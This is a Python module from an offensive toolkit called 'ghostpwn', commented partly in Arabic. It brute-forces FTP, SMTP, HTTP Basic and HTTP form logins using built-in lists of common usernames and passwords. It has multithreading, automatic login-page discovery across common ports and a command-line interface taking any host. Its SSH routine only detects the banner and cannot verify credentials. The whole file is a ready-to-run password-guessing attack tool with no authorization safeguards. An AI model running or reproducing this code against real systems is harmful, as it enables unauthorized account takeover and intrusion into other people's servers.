#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostpwn - Brute Force Module (Zero-Dependency)
SSH / FTP / HTTP / SMTP brute force - بدون paramiko أو مكتبات خارجية
"""
import sys
import os
import socket
import time
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Optional, Tuple
from urllib.parse import urlparse

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.http_client import HttpClient


# ============================ Default Wordlists ============================
DEFAULT_USERNAMES = [
    "admin", "administrator", "root", "user", "test", "guest", "info",
    "mysql", "postgres", "oracle", "sa", "db", "support", "demo",
    "manager", "operator", "backup", "ftp", "mail", "webmaster",
    "superuser", "super", "sysadmin", "netadmin", "guest", "default",
    "user1", "user2", "admin1", "admin2", "test1", "test2",
    "name", "email", "name1", "name2", "contact",
]

DEFAULT_PASSWORDS = [
    "password", "123456", "12345678", "admin", "admin123", "root",
    "qwerty", "letmein", "welcome", "monkey", "dragon", "master",
    "123456789", "1234567890", "abc123", "111111", "password1",
    "iloveyou", "sunshine", "princess", "trustno1", "batman",
    "access", "hello", "charlie", "donald", "login", "starwars",
    "121212", "654321", "666666", "888888", "159753", "13579",
    "passw0rd", "P@ssw0rd", "Pa$$w0rd", "p@ssword", "Password1",
    "123qwe", "1q2w3e", "1q2w3e4r", "q1w2e3r4", "qwerty123",
    "admin@123", "root@123", "test@123", "user@123",
    "changeme", "default", "secret", "summer", "winter",
    "football", "baseball", "soccer", "hockey",
    "company", "business", "school", "money",
]


# ============================ SSH Brute Force ============================
class SSHBruteForcer:
    """SSH brute force - بدون paramiko (socket فقط)"""

    def __init__(self, timeout: float = 5.0, max_threads: int = 5):
        self.timeout = timeout
        self.max_threads = max_threads

    def try_login(self, host: str, port: int, username: str, password: str) -> Tuple[bool, str]:
        """محاولة SSH login (basic banner check)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((host, port))

            # قراءة banner
            banner = sock.recv(1024).decode("utf-8", errors="ignore")
            if "SSH" not in banner:
                return False, "Not SSH"

            # محاولة handshake بسيطة - نتوقع فشل authentication
            # هذه طريقة مبسطة - ما تقدرش تحقق SSH login بالكامل بدون paramiko
            # لكن نقدر نكشف لو الـ credentials صحيحة من رسالة الـ rejection
            sock.close()
            return False, "SSH detected (full auth requires paramiko)"
        except socket.timeout:
            return False, "Timeout"
        except ConnectionRefusedError:
            return False, "Connection refused"
        except Exception as e:
            return False, f"Error: {e}"

    def brute(self, host: str, port: int = 22,
              usernames: List[str] = None,
              passwords: List[str] = None) -> List[Dict]:
        """SSH brute force"""
        usernames = usernames or DEFAULT_USERNAMES[:10]
        passwords = passwords or DEFAULT_PASSWORDS[:30]

        print(f"  [*] SSH brute force on {host}:{port}")
        print(f"      Users: {len(usernames)}, Passwords: {len(passwords)}")
        print(f"      Total: {len(usernames) * len(passwords)} combinations")

        found = []
        attempts = 0

        for username in usernames:
            for password in passwords:
                attempts += 1
                success, msg = self.try_login(host, port, username, password)
                if success:
                    found.append({
                        "service": "ssh",
                        "host": host,
                        "port": port,
                        "username": username,
                        "password": password,
                    })
                    print(f"  [+] FOUND: {username}:{password}")
                    return found

                if attempts % 50 == 0:
                    print(f"      [{attempts}] Trying: {username}:{password}")

        print(f"  [!] SSH brute force: requires paramiko for full auth (not installed)")
        print(f"      SSH banner detected but cannot verify credentials")
        return found


# ============================ FTP Brute Force ============================
class FTPBruteForcer:
    """FTP brute force - socket فقط"""

    def __init__(self, timeout: float = 5.0, max_threads: int = 5):
        self.timeout = timeout
        self.max_threads = max_threads

    def try_login(self, host: str, port: int, username: str, password: str) -> Tuple[bool, str]:
        """محاولة FTP login"""
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((host, port))

            # قراءة banner
            banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
            if "220" not in banner:
                return False, f"FTP not ready: {banner}"

            # إرسال USER
            sock.send(f"USER {username}\r\n".encode())
            user_resp = sock.recv(1024).decode("utf-8", errors="ignore").strip()

            # 331 = Need password
            if not user_resp.startswith("331"):
                if user_resp.startswith("230"):
                    # Logged in without password!
                    return True, "Logged in (no password needed)"
                return False, f"USER rejected: {user_resp}"

            # إرسال PASS
            sock.send(f"PASS {password}\r\n".encode())
            pass_resp = sock.recv(1024).decode("utf-8", errors="ignore").strip()

            # 230 = Logged in
            if pass_resp.startswith("230"):
                return True, "Login successful"

            return False, f"Auth failed: {pass_resp}"

        except socket.timeout:
            return False, "Timeout"
        except ConnectionRefusedError:
            return False, "Connection refused"
        except Exception as e:
            return False, f"Error: {e}"
        finally:
            if sock:
                try:
                    sock.send(b"QUIT\r\n")
                    sock.close()
                except Exception:
                    pass

    def brute(self, host: str, port: int = 21,
              usernames: List[str] = None,
              passwords: List[str] = None,
              max_threads: int = None) -> List[Dict]:
        """FTP brute force"""
        usernames = usernames or DEFAULT_USERNAMES[:10]
        passwords = passwords or DEFAULT_PASSWORDS[:50]
        threads = max_threads or self.max_threads

        print(f"  [*] FTP brute force on {host}:{port}")
        print(f"      Users: {len(usernames)}, Passwords: {len(passwords)}")

        found = []
        attempts = 0
        total = len(usernames) * len(passwords)

        def attempt(creds):
            nonlocal attempts
            username, password = creds
            attempts += 1
            success, msg = self.try_login(host, port, username, password)
            if success:
                return (username, password, msg)
            return None

        creds_list = [(u, p) for u in usernames for p in passwords]

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(attempt, c): c for c in creds_list}
            for future in as_completed(futures):
                if attempts % 50 == 0:
                    print(f"      [{attempts}/{total}] Progress...")
                result = future.result()
                if result:
                    username, password, msg = result
                    found.append({
                        "service": "ftp",
                        "host": host,
                        "port": port,
                        "username": username,
                        "password": password,
                        "note": msg,
                    })
                    print(f"  [+] FOUND: {username}:{password}")
                    return found

        print(f"  [!] No credentials found ({attempts} attempts)")
        return found


# ============================ HTTP Brute Force ============================
class HTTPBruteForcer:
    """HTTP Basic/Digest/Form brute force"""

    def __init__(self, http_client: HttpClient = None, max_threads: int = 5):
        self.client = http_client or HttpClient(timeout=10)
        self.max_threads = max_threads

    def try_basic_auth(self, url: str, username: str, password: str) -> Tuple[bool, str]:
        """HTTP Basic Auth"""
        import base64
        creds = base64.b64encode(f"{username}:{password}".encode()).decode()
        resp = self.client.get(url, headers={"Authorization": f"Basic {creds}"})

        if resp["status"] == 200:
            return True, "Login successful"
        elif resp["status"] == 401:
            return False, "Unauthorized"
        elif resp["status"] == 403:
            return False, "Forbidden"
        else:
            return False, f"Status: {resp['status']}"

    def try_form_auth(self, url: str, username: str, password: str,
                      user_field: str = "username",
                      pass_field: str = "password",
                      extra_fields: Dict = None,
                      success_indicator: str = None,
                      failure_indicator: str = None) -> Tuple[bool, str]:
        """HTTP Form login"""
        data = {user_field: username, pass_field: password}
        if extra_fields:
            data.update(extra_fields)

        resp = self.client.post(url, data=data, headers={
            "Content-Type": "application/x-www-form-urlencoded"
        })

        # فحص indicators
        if success_indicator and success_indicator in resp["body"]:
            return True, "Login successful (success indicator found)"

        if failure_indicator and failure_indicator in resp["body"]:
            return False, "Login failed (failure indicator)"

        # فحص redirects (لو فيه redirect لـ dashboard = نجاح)
        if resp["status"] in (301, 302):
            location = resp["headers"].get("Location", "").lower()
            if any(s in location for s in ["dashboard", "admin", "home", "welcome", "panel"]):
                return True, "Login successful (redirect to dashboard)"

        # فحص cookies (لو فيه session cookie جديد = نجاح محتمل)
        set_cookie = resp["headers"].get("Set-Cookie", "").lower()
        if any(s in set_cookie for s in ["session", "token", "auth", "login"]):
            if "delete" not in set_cookie and "expire" not in set_cookie:
                return True, "Login successful (session cookie set)"

        # فحص status
        if resp["status"] == 200:
            body_len = len(resp["body"])
            # لو الـ response طويل جداً = غالباً صفحة login (فشل)
            # لو قصير = غالباً redirect أو success
            if body_len < 500:
                return True, "Login successful (short response)"

        return False, f"Status: {resp['status']}, Body length: {len(resp['body'])}"

    def brute_basic(self, url: str,
                    usernames: List[str] = None,
                    passwords: List[str] = None,
                    max_threads: int = None) -> List[Dict]:
        """HTTP Basic Auth brute force"""
        usernames = usernames or DEFAULT_USERNAMES[:10]
        passwords = passwords or DEFAULT_PASSWORDS[:50]
        threads = max_threads or self.max_threads

        print(f"  [*] HTTP Basic Auth brute force on {url}")
        print(f"      Users: {len(usernames)}, Passwords: {len(passwords)}")

        found = []
        attempts = 0

        def attempt(creds):
            nonlocal attempts
            username, password = creds
            attempts += 1
            success, msg = self.try_basic_auth(url, username, password)
            return (username, password) if success else None

        creds_list = [(u, p) for u in usernames for p in passwords]

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(attempt, c): c for c in creds_list}
            for future in as_completed(futures):
                if attempts % 50 == 0:
                    print(f"      [{attempts}] Progress...")
                result = future.result()
                if result:
                    username, password = result
                    found.append({
                        "service": "http_basic",
                        "url": url,
                        "username": username,
                        "password": password,
                    })
                    print(f"  [+] FOUND: {username}:{password}")
                    return found

        print(f"  [!] No credentials found ({attempts} attempts)")
        return found

    def brute_form(self, url: str,
                   usernames: List[str] = None,
                   passwords: List[str] = None,
                   user_field: str = "username",
                   pass_field: str = "password",
                   extra_fields: Dict = None,
                   success_indicator: str = None,
                   failure_indicator: str = None,
                   max_threads: int = None) -> List[Dict]:
        """HTTP Form brute force"""
        usernames = usernames or DEFAULT_USERNAMES[:10]
        passwords = passwords or DEFAULT_PASSWORDS[:30]
        threads = max_threads or self.max_threads

        print(f"  [*] HTTP Form brute force on {url}")
        print(f"      Users: {len(usernames)}, Passwords: {len(passwords)}")

        # محاولة لاكتشاف indicators تلقائياً
        if not success_indicator and not failure_indicator:
            print("  [*] Auto-detecting success/failure indicators...")
            # محاولة بـ credentials غلط
            success, msg = self.try_form_auth(
                url, "ghostpwn_test_user", "ghostpwn_test_pass",
                user_field, pass_field, extra_fields
            )
            # حفظ الـ response للفشل كمؤشر
            resp = self.client.post(url, data={
                user_field: "ghostpwn_test_user",
                pass_field: "ghostpwn_test_pass",
                **(extra_fields or {})
            })
            if resp["status"] == 200 and resp["body"]:
                # البحث عن كلمات شائعة للفشل
                body_lower = resp["body"].lower()
                for indicator in ["invalid", "incorrect", "wrong", "failed",
                                  "error", "denied", "mismatch"]:
                    if indicator in body_lower:
                        failure_indicator = indicator
                        print(f"      Auto-detected failure indicator: '{indicator}'")
                        break

        found = []
        attempts = 0

        def attempt(creds):
            nonlocal attempts
            username, password = creds
            attempts += 1
            success, msg = self.try_form_auth(
                url, username, password, user_field, pass_field,
                extra_fields, success_indicator, failure_indicator
            )
            return (username, password, msg) if success else None

        creds_list = [(u, p) for u in usernames for p in passwords]

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(attempt, c): c for c in creds_list}
            for future in as_completed(futures):
                if attempts % 30 == 0:
                    print(f"      [{attempts}] Progress...")
                result = future.result()
                if result:
                    username, password, msg = result
                    found.append({
                        "service": "http_form",
                        "url": url,
                        "username": username,
                        "password": password,
                        "note": msg,
                    })
                    print(f"  [+] FOUND: {username}:{password} ({msg})")
                    return found

        print(f"  [!] No credentials found ({attempts} attempts)")
        return found


# ============================ SMTP Brute Force ============================
class SMTPBruteForcer:
    """SMTP brute force - socket فقط"""

    def __init__(self, timeout: float = 5.0):
        self.timeout = timeout

    def try_login(self, host: str, port: int, username: str, password: str) -> Tuple[bool, str]:
        """محاولة SMTP AUTH LOGIN"""
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((host, port))

            # قراءة banner
            banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
            if "220" not in banner:
                return False, "SMTP not ready"

            # EHLO
            sock.send(b"EHLO ghostpwn\r\n")
            ehlo_resp = sock.recv(1024).decode("utf-8", errors="ignore").strip()

            # AUTH LOGIN
            sock.send(b"AUTH LOGIN\r\n")
            auth_resp = sock.recv(1024).decode("utf-8", errors="ignore").strip()
            if "334" not in auth_resp:
                return False, "AUTH LOGIN not supported"

            # إرسال username (base64)
            sock.send(base64.b64encode(username.encode()) + b"\r\n")
            user_resp = sock.recv(1024).decode("utf-8", errors="ignore").strip()
            if "334" not in user_resp:
                return False, "Username rejected"

            # إرسال password (base64)
            sock.send(base64.b64encode(password.encode()) + b"\r\n")
            pass_resp = sock.recv(1024).decode("utf-8", errors="ignore").strip()

            # 235 = Authentication successful
            if "235" in pass_resp:
                return True, "Login successful"

            return False, f"Auth failed: {pass_resp}"

        except socket.timeout:
            return False, "Timeout"
        except ConnectionRefusedError:
            return False, "Connection refused"
        except Exception as e:
            return False, f"Error: {e}"
        finally:
            if sock:
                try:
                    sock.send(b"QUIT\r\n")
                    sock.close()
                except Exception:
                    pass

    def brute(self, host: str, port: int = 25,
              usernames: List[str] = None,
              passwords: List[str] = None) -> List[Dict]:
        """SMTP brute force"""
        usernames = usernames or DEFAULT_USERNAMES[:10]
        passwords = passwords or DEFAULT_PASSWORDS[:30]

        print(f"  [*] SMTP brute force on {host}:{port}")

        found = []
        for username in usernames:
            for password in passwords:
                success, msg = self.try_login(host, port, username, password)
                if success:
                    found.append({
                        "service": "smtp",
                        "host": host,
                        "port": port,
                        "username": username,
                        "password": password,
                    })
                    print(f"  [+] FOUND: {username}:{password}")
                    return found

        print(f"  [!] No credentials found")
        return found


# ============================ Main ============================
class BruteForceManager:
    """مدير brute force شامل"""

    def __init__(self, http_client: HttpClient = None, max_threads: int = 5):
        self.client = http_client or HttpClient(timeout=10)
        self.max_threads = max_threads

    def auto_brute(self, host: str, ports: List[int] = None) -> List[Dict]:
        """brute force تلقائي على البورتات المكتشفة"""
        if ports is None:
            ports = [21, 22, 25, 80, 443, 8080]

        results = []

        for port in ports:
            print(f"\n  [*] Checking port {port}...")

            if port == 21:
                # FTP
                ftp = FTPBruteForcer(max_threads=self.max_threads)
                ftp_results = ftp.brute(host, 21)
                results.extend(ftp_results)

            elif port == 22:
                # SSH
                ssh = SSHBruteForcer(max_threads=self.max_threads)
                ssh_results = ssh.brute(host, 22)
                results.extend(ssh_results)

            elif port == 25:
                # SMTP
                smtp = SMTPBruteForcer()
                smtp_results = smtp.brute(host, 25)
                results.extend(smtp_results)

            elif port in (80, 443, 8080):
                # HTTP - نفحص لو فيه صفحة login
                protocol = "https" if port in (443, 8443) else "http"
                login_paths = ["/admin", "/login", "/wp-login.php",
                              "/administrator", "/manager", "/console"]

                for path in login_paths:
                    url = f"{protocol}://{host}:{port}{path}"
                    resp = self.client.get(url)
                    if resp["status"] == 401:
                        # Basic Auth
                        http = HTTPBruteForcer(self.client, self.max_threads)
                        http_results = http.brute_basic(url)
                        results.extend(http_results)
                        break
                    elif resp["status"] == 200 and "<form" in resp["body"].lower():
                        # Form login
                        http = HTTPBruteForcer(self.client, self.max_threads)
                        http_results = http.brute_form(url)
                        results.extend(http_results)
                        break

        return results


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="ghostpwn - Brute Force")
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int)
    parser.add_argument("--service", choices=["ssh", "ftp", "smtp", "http-basic", "http-form", "auto"],
                       default="auto")
    parser.add_argument("--url", help="URL for HTTP brute force")
    parser.add_argument("--usernames", help="Comma-separated usernames")
    parser.add_argument("--passwords", help="Comma-separated passwords")
    parser.add_argument("--threads", type=int, default=5)
    args = parser.parse_args()

    usernames = args.usernames.split(",") if args.usernames else None
    passwords = args.passwords.split(",") if args.passwords else None

    if args.service == "ftp":
        brute = FTPBruteForcer(max_threads=args.threads)
        results = brute.brute(args.host, args.port or 21, usernames, passwords)
    elif args.service == "ssh":
        brute = SSHBruteForcer(max_threads=args.threads)
        results = brute.brute(args.host, args.port or 22, usernames, passwords)
    elif args.service == "smtp":
        brute = SMTPBruteForcer()
        results = brute.brute(args.host, args.port or 25, usernames, passwords)
    elif args.service == "http-basic":
        brute = HTTPBruteForcer(max_threads=args.threads)
        results = brute.brute_basic(args.url, usernames, passwords)
    elif args.service == "http-form":
        brute = HTTPBruteForcer(max_threads=args.threads)
        results = brute.brute_form(args.url, usernames, passwords)
    elif args.service == "auto":
        manager = BruteForceManager(max_threads=args.threads)
        results = manager.auto_brute(args.host)

    print(f"\n[✓] Found {len(results)} valid credentials")
    for r in results:
        print(f"  {r['service']}: {r.get('username', '')}:{r.get('password', '')}")
